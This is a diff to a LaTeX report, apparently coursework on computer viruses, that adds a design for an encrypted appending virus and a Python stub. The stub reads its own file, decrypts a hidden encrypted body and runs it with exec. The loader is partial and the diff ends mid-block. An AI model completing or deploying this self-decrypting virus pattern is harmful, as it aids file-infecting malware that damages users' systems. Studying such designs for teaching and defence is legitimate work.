@@ -17,6 +17,9 @@
 \usepackage{array}
 \usepackage{setspace}
 \usepackage{minted}
+\AtBeginEnvironment{minted}{
+    \fontsize{11}{11}
+    \selectfont}
 
 %%%%%%%%%%%
 % 			Macro		%
@@ -53,7 +56,7 @@
 \maketitle
 
 \section{Introduction}
-The purpose is to design a virus similar to the vbash one, except that it will be encrypted. Its structure is divided in two parts:
+The purpose is to design a virus similar to the \textit{vbash} one, except that it will be encrypted. Its structure is divided in two parts:
 \begin{itemize}
 \item The first part of the code will be unencrypted and will simply consist of the decryption function. The key will be made of the first bytes of the infected virus.
 \item The second part (the most important one) will consist of the main body of the virus.
@@ -61,15 +64,40 @@ The purpose is to design a virus similar to the vbash one, except that it will b
 The virus will be an appending one. It will spread as follows:
 \begin{itemize}
 \item It looks for infected is executed.
-\item During the infection, it creates a specific key for each file (once again, 
+\item During the infection, it creates a specific key for each file (once again, a few bytes are taken from the target file), then encrypts its own main body and adds both the decrypting routine and the ( encrypted ) main viral body to the target file.
+\item A potential payload may be triggered ( with or without a delayed action mechanism).
 \end{itemize}
 
 \section{Virus design}
 
+
 \section{Implementation}
 
+\begin{minted}[ mathescape, frame=lines]{python} 
+# Open the virus itself
+this = open(__main__.__file__, 'r')
+# Set copy variable to False
+copy = False
+# Initialize an empty payload
+cipher_payload = ''
 
+# Search for the encrypted main body of the virus and copy it into cipher_payload
+for line in this:
+   if line.strip() == '# Start payload':
+      copy = True
+   elif line.strip() == '# End payload':
+      copy = False
+   elif copy:
+      cipher_payload = cipher_payload + line
+# Decrypt the main body of the virus and execute it.
+e = decrypt(cipher_payload[1:])
+exec e
 
+# Encrypted main body of the virus
+# Start payload
+#8eoDXnZwwdY/TUaf5IQOo5+tbvE2zllu4t0m...
+# End payload
+\end{minted}
 
 
 \begin{minted}[mathescape,
